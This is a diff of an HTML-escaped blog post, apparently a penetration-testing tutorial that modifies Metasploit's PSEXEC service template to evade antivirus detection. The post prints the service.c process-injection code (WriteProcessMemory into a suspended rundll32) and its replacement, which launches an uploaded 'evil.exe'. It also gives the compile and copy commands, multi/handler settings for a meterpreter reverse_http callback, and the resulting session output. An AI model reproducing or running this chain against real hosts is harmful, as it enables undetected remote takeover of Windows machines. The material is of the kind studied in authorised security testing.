@@ -23,14 +23,14 @@
 &lt;p&gt;The service binary that is used as part of PSEXEC is located here:&lt;/p&gt;
 &lt;p&gt;MSF Directory/data/templates/src/pe/exe/service/service.c&lt;/p&gt;
 &lt;p&gt;The important part to look at starts at line 57:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;define WIN32_LEAN_AND_MEAN&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define WIN32_LEAN_AND_MEAN
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
-&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;define PAYLOAD_SIZE	8192&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define PAYLOAD_SIZE	8192
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
-&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; cServiceName[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SERVICENAME&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; cServiceName[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SERVICENAME&amp;#34;&lt;/span&gt;;
 
-&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; bPayload[PAYLOAD_SIZE] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;PAYLOAD:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; bPayload[PAYLOAD_SIZE] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PAYLOAD:&amp;#34;&lt;/span&gt;;
 
 SERVICE_STATUS ss;
 
@@ -41,7 +41,7 @@ SERVICE_STATUS_HANDLE hStatus &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/sp
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
 BOOL &lt;span style=&#34;color:#a6e22e&#34;&gt;ServiceHandler&lt;/span&gt;( DWORD dwControl )
 {
-	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( dwControl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SERVICE_CONTROL_STOP &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; dwControl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SERVICE_CONTROL_SHUTDOWN )
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( dwControl &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; SERVICE_CONTROL_STOP &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; dwControl &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; SERVICE_CONTROL_SHUTDOWN )
 	{
 		ss.dwWin32ExitCode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
 		ss.dwCurrentState  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SERVICE_STOPPED;
@@ -79,7 +79,7 @@ VOID &lt;span style=&#34;color:#a6e22e&#34;&gt;ServiceMain&lt;/span&gt;( DWORD d
 
 		SetServiceStatus( hStatus, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ss );
 
-		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( CreateProcess( NULL, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;rundll32.exe&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;si, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pi ) )
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( CreateProcess( NULL, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rundll32.exe&amp;#34;&lt;/span&gt;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;si, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pi ) )
 		{
 			Context.ContextFlags &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; CONTEXT_FULL;
 		  
@@ -89,11 +89,11 @@ VOID &lt;span style=&#34;color:#a6e22e&#34;&gt;ServiceMain&lt;/span&gt;( DWORD d
 			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( lpPayload )
 			{
 				WriteProcessMemory( pi.hProcess, lpPayload, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bPayload, PAYLOAD_SIZE, NULL );
-&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;ifdef _WIN64&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#ifdef _WIN64
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;				Context.Rip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (DWORD64)lpPayload;
-&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#else
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;				Context.Eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (DWORD)lpPayload;
-&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;endif&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#endif
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;				SetThreadContext( pi.hThread, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Context );
 			}
 
@@ -123,9 +123,9 @@ VOID &lt;span style=&#34;color:#a6e22e&#34;&gt;ServiceMain&lt;/span&gt;( DWORD d
 	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;st );
 }
 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It&#39;s injecting our payload into the service binary and tossing our payload into &amp;ldquo;rundll32.exe&amp;rdquo; at run time on the victim (side note: you can change which bin it goes into ;). Lets change this so it doesn&#39;t do any injection and just executes a binary. That removes the &amp;lsquo;injection&amp;rsquo; piece and hopefully lets us get our shell. We are loosing a bit of stealth because instead of just one (the service binary) we are writing two binaries.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It&amp;rsquo;s injecting our payload into the service binary and tossing our payload into &amp;ldquo;rundll32.exe&amp;rdquo; at run time on the victim (side note: you can change which bin it goes into ;). Lets change this so it doesn&amp;rsquo;t do any injection and just executes a binary. That removes the &amp;lsquo;injection&amp;rsquo; piece and hopefully lets us get our shell. We are loosing a bit of stealth because instead of just one (the service binary) we are writing two binaries.&lt;/p&gt;
 &lt;p&gt;To make this change you replace the above with just this:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( CreateProcess( NULL, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;C:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;evil.exe&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;si, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pi ) )
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( CreateProcess( NULL, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\evil.exe&amp;#34;&lt;/span&gt;, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;si, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pi ) )
 {
 	CloseHandle( pi.hProcess );
 }
@@ -133,7 +133,7 @@ VOID &lt;span style=&#34;color:#a6e22e&#34;&gt;ServiceMain&lt;/span&gt;( DWORD d
 &lt;pre&gt;&lt;code&gt;i386-mingw32-gcc -o service.exe service.c 
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then just copy it to replace the current one:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;cp service.exe ../../../../template_x86_windows_svc.exe 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;No other changes are needed. Only problem is, how do we get the &amp;ldquo;evil.exe&amp;rdquo; up onto the box for it to execute? That&#39;s where the auxiliary module &amp;ldquo;auxiliary/admin/smb/upload_file&amp;rdquo; comes in :-) I built a resource file to demo the timeline of getting execution with this new service binary (broken up with comments to explain, &lt;em&gt;remove the comments for it to work&lt;/em&gt;):&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;No other changes are needed. Only problem is, how do we get the &amp;ldquo;evil.exe&amp;rdquo; up onto the box for it to execute? That&amp;rsquo;s where the auxiliary module &amp;ldquo;auxiliary/admin/smb/upload_file&amp;rdquo; comes in :-) I built a resource file to demo the timeline of getting execution with this new service binary (broken up with comments to explain, &lt;em&gt;remove the comments for it to work&lt;/em&gt;):&lt;/p&gt;
 &lt;p&gt;Start Multi Handler&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;use multi/handler
 set PAYLOAD windows/meterpreter/reverse_http
@@ -160,7 +160,7 @@ set LHOST 172.16.195.1
 set LPORT 80
 exploit -j -z
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The passwords could have just as easily been hashes, and the end result is:&lt;/p&gt;
-&lt;p&gt;Well I can&#39;t really show you that nothing was detected… so I guess you just have to believe me when I say:&lt;/p&gt;
+&lt;p&gt;Well I can&amp;rsquo;t really show you that nothing was detected… so I guess you just have to believe me when I say:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt; [*] Meterpreter session 2 opened (172.16.195.1:80 -&amp;gt; 172.16.195.155:49169) at Wed Jul 04 16:02:23 -0400 2012
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;w00t!&lt;/p&gt;
 </description>
